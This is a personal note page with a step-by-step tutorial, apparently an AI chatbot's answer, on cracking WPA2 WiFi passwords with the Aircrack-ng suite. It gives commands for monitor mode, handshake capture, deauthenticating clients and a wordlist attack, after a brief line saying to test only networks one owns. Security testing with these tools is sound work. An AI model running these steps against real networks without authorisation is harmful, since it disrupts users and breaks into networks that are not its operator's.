[[Aircrack-ng]]
#cybercrime #cybersecurity #hacking #aircrack-ng #WiFi 


Using **Aircrack-ng** is a classic rite of passage for anyone getting into penetration testing. It’s essentially a suite of tools used to assess WiFi network security.

Just a quick "peer-to-peer" heads-up: only use these tools on networks you own or have explicit permission to test. Doing this on the neighbor's WiFi isn't just uncool; it's illegal.

Here is the standard workflow for cracking a WPA2 network using a dictionary attack.

---

## 1. Prerequisites

Before you start, you need two things:

* **A compatible WiFi adapter:** It must support "Monitor Mode" and "Packet Injection."
* **A Wordlist:** A text file containing thousands of potential passwords (e.g., `rockyou.txt`).

---

## 2. The Step-by-Step Process

### Step 1: Enable Monitor Mode

First, identify your wireless interface (usually `wlan0`) and stop any processes that might interfere. Note :- to find your interface, type ip a or iwconfig/ipconfig

```bash
airmon-ng check kill
airmon-ng start wlan0

```

*Your interface name will likely change to `wlan0mon`.*

### Step 2: Locate the Target

Scan the airwaves to find the BSSID (MAC address) and Channel of the network you want to test.

```bash
airodump-ng wlan0mon

```

### Step 3: Capture the Handshake

Now, tell your card to listen only to your target network and write the data to a file. You need to wait for a device to connect so you can capture the **4-way handshake**.

```bash
airodump-ng -c [channel] --bssid [target_MAC] -w [filename] wlan0mon

```

### Step 4: Force a Handshake (Optional)

If you don't want to wait for a user to log in naturally, you can send "Deauthentication" packets to kick a device off the network momentarily. When it reconnects, you’ll grab the handshake.

```bash
aireplay-ng -0 5 -a [target_MAC] wlan0mon

```

### Step 5: Crack the Password

Once `airodump-ng` displays "WPA handshake" in the top right corner, you have the encrypted key. Now you use your CPU/GPU to guess the password against your wordlist.

```bash
aircrack-ng -w [path_to_wordlist] -b [target_MAC] [filename-01.cap]

```

---

## Summary of Tools in the Suite

| Tool | Purpose |
| --- | --- |
| **airmon-ng** | Switches your card from Managed to Monitor mode. |
| **airodump-ng** | Captures raw 802.11 frames (the "sniffer"). |
| **aireplay-ng** | Injects frames to generate traffic or deauthenticate users. |
| **aircrack-ng** | The cracker that uses the captured data to find the key. |

---

**What's the next move?** I can help you troubleshoot why your adapter isn't entering monitor mode, or we can talk about how to defend against these exact attacks by hardening your router settings. Which one interests you?